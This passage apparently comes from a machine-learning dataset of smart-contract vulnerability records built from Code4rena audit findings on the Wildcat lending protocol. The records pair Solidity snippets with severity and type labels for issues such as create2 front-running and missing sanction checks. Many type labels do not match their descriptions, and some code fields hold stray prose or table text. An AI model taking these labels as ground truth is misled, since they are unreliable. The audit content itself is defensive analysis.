    "description": "The contract uses the `create2` method to deploy the market, allowing users to provide a salt. However, since the salt check allows the last 20 bytes of the salt to be zero, deployment transactions with such salts could be subject to front-running attacks by malicious users who use the same salt. if (!(address(bytes20(salt)) == msg.sender || bytes20(salt) == bytes20(0))) { revert SaltDoesNotContainSender(); }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.138,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "getRegisteredBorrowers",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Low Severity Issues",
    "description": "| Issue ID | Description | Location | Impact | Recommended Mitigation Steps | | -------- | ----------- | -------- | ------ | ---------------------------- | | L-01 | Unconstrained `timeToLive` parameter in `addRoleProvider` | [AccessControlHooks.sol](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol), [FixedTermLoanHooks.sol](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/FixedTermLoanHooks.sol) | Low | Add in bounds checking for `timeToLive` | | L-02 | Immediate role provider removal without safeguards | [AccessControlHooks.sol](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/AccessControlHooks.sol), [FixedTermLoanHooks.sol](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/access/FixedTermLoanHooks.sol) | Low | Use time-delayed, two-step removal process | | L-03 | Unlimited token approvals in `transferFrom` | [WildcatMarketToken.sol](https://github.com/code-423n4/2024-08-wildcat/blob/main/src/market/WildcatMarketToken.sol) | Low | Create an approval reduction function and set max approval limits |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.022,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nfunction transferFrom(address from, address to, uint256 amount) external virtual nonReentrant returns (bool) {\n  uint256 allowed = allowance[from][msg.sender];\n  if (allowed != type(uint256).max) {\n    uint256 newAllowance = allowed - amount;\n    _approve(from, msg.sender, newAllowance);\n  }\n  // same\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "In WildcatMarketToken.sol: function transferFrom(address from, address to, uint256 amount) external virtual nonReentrant returns (bool) { uint256 allowed = allowance[from][msg.sender]; if (allowed != type(uint256).max) { uint256 newAllowance = allowed - amount;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.314,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nfunction setMaxTotalSupply(\n  uint256 _maxTotalSupply\n) external onlyBorrower nonReentrant sphereXGuardExternal {\n  MarketState memory state = _getUpdatedState();\n  if (state.isClosed) revert_CapacityChangeOnClosedMarket();\n\n  hooks.onSetMaxTotalSupply(_maxTotalSupply, state);\n  state.maxTotalSupply = _maxTotalSupply.toUint128();\n  _writeState(state);\n  emit_MaxTotalSupplyUpdated(_maxTotalSupply);\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "In WildcatMarketConfig.sol, the `setMaxTotalSupply` function allows the borrower to change the maximum total supply without any time delay: function setMaxTotalSupply( uint256 _maxTotalSupply ) external onlyBorrower nonReentrant sphereXGuardExternal { MarketState memory state = _getUpdatedState();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 13,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.412,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "getRegisteredBorrowers",
    "vulnerability_label": 1,
    "vulnerability_type": "dos",
    "severity": "Low",
    "title": "L-08 DOS risk in `getRegisteredBorrowers`",
    "description": "",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.022,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nfunction getRegisteredBorrowers(uint256 offset, uint256 limit) external view returns (address[] memory, uint256) {\n  uint256 total = _borrowers.length();\n  uint256 end = MathUtils.min(offset + limit, total);\n  uint256 count = end - offset;\n  \n  address[] memory borrowers = new address[](count);\n  for (uint256 i = 0; i < count; i++) {\n    borrowers[i] = _borrowers.at(offset + i);\n  }\n  \n  return (borrowers, total);\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Recommended Mitigation Steps",
    "description": "Add pagination for large data sets: function getRegisteredBorrowers(uint256 offset, uint256 limit) external view returns (address[] memory, uint256) { uint256 total = _borrowers.length(); uint256 end = MathUtils.min(offset + limit, total); uint256 count = end - offset;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.429,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\nIf the hooksData has a length of 20 bytes (which represents just a provider address), _handleHooksData will attempt to get a credential from that provider using _tryGetCredential.\nIf that fails, the code then checks if there's a lastProvider and attempts to refresh the credential using the same _tryGetCredential method.\nIf the provider in hooksData (with length 20) is the same as lastProvider, this would result in trying to get a credential from the same provider twice.\n\nThis redundancy could lead to unnecessary gas consumption and potentially confusing behavior. \n\n\n\n2. In HooksFactory, once a hooks template is disabled, there's no way to re-enable it.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "1. Inefficient Credential Validation: Potential Double-Check of Same Provider in AccessControlHooks Contract",
    "description": "https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/access/AccessControlHooks.sol#L670-L680 // Handle the calldata suffix, if any if (_handleHooksData(status, accountAddress, hooksData)) { return (true, true); }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.663,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "WildcatArchController::removeMarket",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "# L01 - `WildcatArchController::removeMarket` do not call XSphere.removeAllowedSender",
    "description": "https://github.com/code-423n4/2024-08-wildcat/blob/main/src/WildcatArchController.sol#L347-L360",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.035,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: src/WildcatArchController.sol\n347:   function registerMarket(address market) external onlyController {\n348:     if (!_markets.add(market)) {\n349:       revert MarketAlreadyExists();\n350:     }\n351:     _addAllowedSenderOnChain(market);\n352:     emit MarketAdded(msg.sender, market);\n353:   }\n354: \n355:   function removeMarket(address market) external onlyOwner {\n356:     if (!_markets.remove(market)) {\n357:       revert MarketDoesNotExist();\n358:     }\n359:     emit MarketRemoved(market);\n360:   }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Vulnerability details",
    "description": "Adding a market to the Arch Controller also add its address to the allowed sender of the XSphere component. But removing the market from the Arch Controller do not remove it from the allowed senders File: src/WildcatArchController.sol 347:   function registerMarket(address market) external onlyController { 348:     if (!_markets.add(market)) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.517,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "WildcatMarket::rescueToken",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Vulnerability details",
    "description": "The `WildcatMarket::rescueToken` function prevent borrower to rescue market's asset tokens, which make total sense as this would allow to borrow the funds without going through the borrower Chainalysis sanction check. But the function disallow the transfer of market's shares, which make seems to make less sense, as the market should never have a balance of its own tokens in the first place, as only Accounts that deposited, or got transfered market's shares have a balance.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.026,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_calculateTemporaryReserveRatioBips",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "Vulnerability details",
    "description": "The `_calculateTemporaryReserveRatioBips` checks if the APR has been reduced by more than 25% from its previous value. [If this is the case](https://docs.wildcat.finance/using-wildcat/day-to-day-usage/borrowers#reducing-apr), the Reserve Ratio of the market must be increased based on a formula As the precision of the calculations are Bips (10_000), if the borrower reduce the APR by 25.009%, this will be considered 25.00% still, and will not trigger a Reserve Ratio update.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.035,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "WildcatMarketWithdrawals::executeWithdrawal",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Gas",
    "title": "Vulnerability details",
    "description": "https://docs.wildcat.finance/using-wildcat/day-to-day-usage/the-sentinel#borrower-gets-sanctioned The Wildcat Documentation states that once a borrower get sanctionned no escrow contract can be created for the borrower's related markets. But this is not true, right now, nothing prevent an escrow contract to be created: - `WildcatMarketWithdrawals::executeWithdrawal` do not check borrower's sanction before creating the escrow contract - the `WildcatSanctionsSentinel::createEscrow` function is not protected and allow anyone to create an escrow contract",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.043,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: src/access/AccessControlHooks.sol\n344:         if (status.canRefresh) {\n345:           if (_tryGetCredential(status, provider, accountAddress)) {\n346:             return status;\n347:           }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Vulnerability details",
    "description": "Before calling `_tryGetCredential`, `getLenderStatus` does a check on the lender status to verify if the previous: File: src/access/AccessControlHooks.sol 344:         if (status.canRefresh) { 345:           if (_tryGetCredential(status, provider, accountAddress)) { 346:             return status;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.21,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "state.scaledPendingWithdrawals",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Vulnerability details",
    "description": "A malicious actor with sanctionned funds can send tokens to a market right before `updateState/_getUpdatedState` and `_writeState` are called. The funds will be marked for a batch, and registered in the `availableLiquidity` Then, it will be used to calculate the new values for `batch.scaledAmountBurned` and `state.scaledPendingWithdrawals`, basically poisoning the market and lenders who received those assets with assets from an OFAC sanctionned address. This could cause multiple lenders to be also flagged as sanctionned causing further legal issues. Because assets can be deposited to be distributed without interacting with the protocol external functions, XSphere protection will have no power to block this. Also, this might not be noticed by the borrower.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.03,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "lastInterestAccruedTimestamp = expiry",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Vulnerability details",
    "description": "See similar finding: https://github.com/code-423n4/2023-10-wildcat-findings/issues/455 Every time `_getUpdateState` is called, two fees update are computed following this scheme: 1. if expired batches exists, compute fees for expired batch and update `lastInterestAccruedTimestamp = expiry` 2. process expired batch, which update the `state.scaledTotalSupply` value (reducing it) 3. compute fees from `lastInterestAccruedTimestamp` to `block.timestamp`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.037,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " Validation                                                         |\n| [L-14]      | Brittle and Inefficient Assembly-based Custom Error Handling                              |\n| [L-15]      | Unrestricted Gas Forwarding in External Calls Leading to Potential ",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "| Issue Count | Issue Title                                                                |",
    "description": "|-------------|-------------------------------------------------------------------------------------------| | [L-1]       | Borrower Address ``Blocklisting`` by ``Tokens`` Preventing ``Market Close``                       | | [L-2]       | Risk of Lenders Deposit Reverts Due to Sudden Decrease in `maxTotalSupply`                | | [L-3]       | Front-Running Risk in ``Multi-Lender`` Deposit Process Leading to ``Transaction Reverts``         | | [L-4]       | Deterministic Contract Address Generation and Replay Attack Exposure in `create` Deployment |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.261,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFILE: 2024-08-wildcat/src/market/WildcatMarket.sol\n\n function closeMarket() external onlyBorrower nonReentrant sphereXGuardExternal {\n    MarketState memory state = _getUpdatedState();\n\n    if (state.isClosed) revert_MarketAlreadyClosed();\n\n    uint256 currentlyHeld = totalAssets();\n    uint256 totalDebts = state.totalDebts();\n    if (currentlyHeld < totalDebts) {\n      // Transfer remaining debts from borrower\n      uint256 remainingDebt = totalDebts - currentlyHeld;\n      _repay(state, remainingDebt, 0x04);\n      currentlyHeld += remainingDebt;\n    } else if (currentlyHeld > totalDebts) {\n      uint256 excessDebt = currentlyHeld - totalDebts;\n      // Transfer excess assets to borrower\n      asset.safeTransfer(borrower, excessDebt);\n      currentlyHeld -= excessDebt;\n    }\n    hooks.onCloseMarket(state);\n    state.annualInterestBips = 0;\n    state.isClosed = true;\n    state.reserveRatioBips = 10000;\n    // Ensures that delinquency fee doesn't increase scale factor further\n    // as doing so would mean last lender in market couldn't fully redeem\n    state.timeDelinquent = 0;\n\n    // Still track available liquidity in case of a rounding error\n    uint256 availableLiquidity = currentlyHeld -\n      (state.normalizedUnclaimedWithdrawals + state.accruedProtocolFees);\n\n    // If there is a pending withdrawal batch which is not fully paid off, set aside\n    // up to the available liquidity for that batch.\n    if (state.pendingWithdrawalExpiry != 0) {\n      uint32 expiry = state.pendingWithdrawalExpiry;\n      WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n      if (batch.scaledAmountBurned < batch.scaledTotalAmount) {\n        (, uint128 normalizedAmountPaid) = _applyWithdrawalBatchPayment(\n          batch,\n          state,\n          expiry,\n          availableLiquidity\n        );\n        availableLiquidity -= normalizedAmountPaid;\n        _withdrawalData.batches[expiry] = batch;\n      }\n    }\n\n    uint256 numBatches = _withdrawalData.unpaidBatches.length();\n    for (uint256 i; i < numBatches; i++) {\n      // Process the next unpaid batch using available liquidity\n      uint256 normalizedAmountPaid = _processUnpaidWithdrawalBatch(state, availableLiquidity);\n      // Reduce liquidity available to next batch\n      availableLiquidity -= normalizedAmountPaid;\n    }\n\n    if (state.scaledPendingWithdrawals != 0) {\n      revert_CloseMarketWithUnpaidWithdrawals();\n    }\n\n    _writeState(state);\n    emit_MarketClosed(block.timestamp);\n  }\n\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "## [L-1] Borrower Address Blocklisting by Tokens Preventing Market Shutdown",
    "description": "In this closeMarket function, the borrower is responsible for closing the market, which involves reconciling debts and transferring excess assets to or from the borrower. However, if the borrower's address is blocklisted by a token (such as USDC or USDT), the market cannot be closed successfully. - If the borrower owes more than the contract currently holds (currentlyHeld < totalDebts), the borrower is required to repay the remaining debt. The _repay() function will be called to transfer assets from the borrower to the contract. - If the contract holds more assets than the total debts (currentlyHeld > totalDebts), the excess assets are transferred back to the borrower using asset.safeTransfer(borrower, excessDebt). If the borrower's address is blocklisted, the token contract will prevent the transfer to the borrower. As a result, the excess assets cannot be transferred to the borrower, which will prevent the market from closing successfully.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 68,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFILE: 2024-08-wildcat/src/market/WildcatMarket.sol\n\nfunction _depositUpTo(\n    uint256 amount\n  ) internal virtual nonReentrant returns (uint256 /* actualAmount */) {\n    // Get current state\n    MarketState memory state = _getUpdatedState();\n\n    if (state.isClosed) revert_DepositToClosedMarket();\n\n    // Reduce amount if it would exceed totalSupply\n    amount = MathUtils.min(amount, state.maximumDeposit());\n\n    // Scale the mint amount\n    uint104 scaledAmount = state.scaleAmount(amount).toUint104();\n    if (scaledAmount == 0) revert_NullMintAmount();\n\n    // Cache account data and revert if not authorized to deposit.\n    Account memory account = _getAccount(msg.sender);\n\n    hooks.onDeposit(msg.sender, scaledAmount, state);\n\n    // Transfer deposit from caller\n    asset.safeTransferFrom(msg.sender, address(this), amount);\n\n    account.scaledBalance += scaledAmount;\n    _accounts[msg.sender] = account;\n\n    emit_Transfer(_runtimeConstant(address(0)), msg.sender, amount);\n    emit_Deposit(msg.sender, amount, scaledAmount);\n\n    // Increase supply\n    state.scaledTotalSupply += scaledAmount;\n\n    // Update stored state\n    _writeState(state);\n\n    return amount;\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Result:",
    "description": "- When Lender A's transaction is executed after Lender B's deposit, the available space (state.maximumDeposit()) might have been reduced to 0, or a much smaller amount than Lender A intended to deposit. - This causes Lender A's transaction to revert, because the scaled amount that would be minted for Lender A would now be 0, leading to a revert_NullMintAmount(). The deposit process as written is not inherently FIFO (First In, First Out). The order of execution of transactions is determined by the blockchain\u2019s transaction confirmation process, which means that transactions with higher gas prices can be confirmed faster, allowing for front-running. In this case, Lender B can \"jump the queue\" by paying a higher gas fee, which leads to Lender A\u2019s transaction failing if the available space is reduced. FILE: 2024-08-wildcat/src/market/WildcatMarket.sol function _depositUpTo(",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 42,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": ", your contract deployment process becomes more secure, protecting against both front-running and replay attacks.\n\nThe salt is a value you choose, and it allows you to control the address deterministically but unpredictably.\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Recommended Mitigation",
    "description": "By implementing ``create2``, your contract deployment process becomes more secure, protecting against both front-running and replay attacks. The salt is a value you choose, and it allows you to control the address deterministically but unpredictably. hooksInstance := create2(0, initCodePointer, initCodeSizeWithArgs, someUniqueSalt)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.226,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "FILE: 2024-08-wildcat/src/HooksFactory.sol\n\n/// @dev Update the fees for a hooks template\n  /// Note: The new fee structure will apply to all NEW markets created with existing\n  ///       or future instances of the hooks template, and the protocol fee can be pushed\n  ///       to existing markets using `pushProtocolFeeBipsUpdates`.\n  function updateHooksTemplateFees(\n    address hooksTemplate,\n    address feeRecipient,\n    address originationFeeAsset,\n    uint80 originationFeeAmount,\n    uint16 protocolFeeBips\n  ) external override onlyArchControllerOwner {\n    if (!_templateDetails[hooksTemplate].exists) {\n      revert HooksTemplateNotFound();\n    }\n    _validateFees(feeRecipient, originationFeeAsset, originationFeeAmount, protocolFeeBips);\n    HooksTemplate storage template = _templateDetails[hooksTemplate];\n    template.feeRecipient = feeRecipient;\n    template.originationFeeAsset = originationFeeAsset;\n    template.originationFeeAmount = originationFeeAmount;\n    template.protocolFeeBips = protocolFeeBips;\n    emit HooksTemplateFeesUpdated(\n      hooksTemplate,\n      feeRecipient,\n      originationFeeAsset,\n      originationFeeAmount,\n      protocolFeeBips\n    );\n  }\n\n  function disableHooksTemplate(address hooksTemplate) external override onlyArchControllerOwner {\n    if (!_templateDetails[hooksTemplate].exists) {\n      revert HooksTemplateNotFound();\n    }\n    _templateDetails[hooksTemplate].enabled = false;\n    // Emit an event to indicate that the template has been removed\n    emit HooksTemplateDisabled(hooksTemplate);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "## [L-5] Ability to Update Deprecated ``hooksTemplate`` Poses Security and Lifecycle Management Risks",
    "description": "In the current implementation, there are no checks ensuring that the hooksTemplate being updated is either a deployed or valid template. As per the documentation, it\u2019s possible to update template attributes like fees even when the ``_templateDetails[hooksTemplate]``.enabled flag is set to false (i.e., the template is deprecated or disabled). The contract does not check whether the hooksTemplate being referenced is ``deployed`` or ``active`` before allowing updates to its attributes, such as fees or configurations. This means deprecated or disabled templates (where _templateDetails[hooksTemplate].enabled == false) can still have their attributes modified, despite not being in use. FILE: 2024-08-wildcat/src/HooksFactory.sol /// @dev Update the fees for a hooks template",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 40,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFILE:2024-08-wildcat/src\n/WildcatArchController.sol\n\nfunction registerController(address controller) external onlyControllerFactory {\n    if (!_controllers.add(controller)) {\n      revert ControllerAlreadyExists();\n    }\n    _addAllowedSenderOnChain(controller);\n    emit ControllerAdded(msg.sender, controller);\n  }\n\n  function removeController(address controller) external onlyOwner {\n    if (!_controllers.remove(controller)) {\n      revert ControllerDoesNotExist();\n    }\n    emit ControllerRemoved(controller);\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "## [L-6] Governance Conflict in Controller Management Due to Separate Addition and Removal Authorities",
    "description": "The ControllerFactory could add a controller that introduces vulnerabilities or unwanted features, and the owner may not be able to remove it quickly enough to prevent damage. During the time it takes for the owner to remove the controller, the system could be exposed to exploitation. FILE:2024-08-wildcat/src /WildcatArchController.sol function registerController(address controller) external onlyControllerFactory { if (!_controllers.add(controller)) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.53,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFILE:2024-08-wildcat/src/HooksFactory.sol\n\n TmpMarketParameterStorage memory tmp = TmpMarketParameterStorage({\n      borrower: msg.sender,\n      asset: parameters.asset,\n      packedNameWord0: bytes32(0),\n      packedNameWord1: bytes32(0),\n      packedSymbolWord0: bytes32(0),\n      packedSymbolWord1: bytes32(0),\n      decimals: decimals,\n      feeRecipient: templateDetails.feeRecipient,\n      protocolFeeBips: templateDetails.protocolFeeBips,\n      maxTotalSupply: parameters.maxTotalSupply,\n      annualInterestBips: parameters.annualInterestBips,\n      delinquencyFeeBips: parameters.delinquencyFeeBips,\n      withdrawalBatchDuration: parameters.withdrawalBatchDuration,\n      reserveRatioBips: parameters.reserveRatioBips,\n      delinquencyGracePeriod: parameters.delinquencyGracePeriod,\n      hooks: parameters.hooks\n    });\n    {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "## [L-7] Lack of Validation for Critical Market Parameters Leads to Potential Misconfiguration",
    "description": "The issue here involves missing validation checks for critical parameters when deploying new markets, specifically for parameters like parameters.maxTotalSupply, parameters.withdrawalBatchDuration, parameters.reserveRatioBips, and parameters.delinquencyGracePeriod. These parameters likely play an important role in the functionality and behavior of the new market, and failing to validate them properly before deployment introduces several risks, such as misconfiguration, abuse, or security vulnerabilities. FILE:2024-08-wildcat/src/HooksFactory.sol TmpMarketParameterStorage memory tmp = TmpMarketParameterStorage({ borrower: msg.sender, asset: parameters.asset,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 24,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.848,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFILE: 2024-08-wildcat/src/types/TransientBytesArray.sol\n\n if eq(outOfPlaceEncoding, lt(length, 32)) {\n          // Store the Panic error signature.\n          mstore(0, Panic_ErrorSelector)\n          // Store the arithmetic (0x11) panic code.\n          mstore(Panic_ErrorCodePointer, Panic_InvalidStorageByteArray)\n          // revert(abi.encodeWithSignature(\"Panic(uint256)\", 0x22))\n          revert(Error_SelectorPointer, Panic_ErrorLength)\n        }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "## [L-9] Panic on Length Mismatch in ``extractByteArrayLength``",
    "description": "The extractByteArrayLength function throws a panic if the encoding of the byte array is out of place. The condition for this panic is complex and could be prone to error if encoding is not handled properly, leading to the contract reverting unexpectedly. FILE: 2024-08-wildcat/src/types/TransientBytesArray.sol if eq(outOfPlaceEncoding, lt(length, 32)) { // Store the Panic error signature. mstore(0, Panic_ErrorSelector)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 13,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.462,
    "vulnerability_types": [
